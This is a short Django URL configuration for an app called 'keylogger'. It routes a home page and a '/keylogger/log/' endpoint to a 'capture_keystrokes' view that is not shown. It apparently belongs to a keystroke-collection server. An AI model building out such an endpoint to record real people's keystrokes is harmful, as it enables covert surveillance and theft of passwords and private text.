from django.contrib import admin
from django.urls import path, include
from keylogger.views import home, capture_keystrokes  # Import both views

urlpatterns = [
    path('admin/', admin.site.urls),
    path('', home, name='home'),  # Root URL for home page
    path('keylogger/log/', capture_keystrokes, name='capture_keystroke'),  # Keystroke logging endpoint
]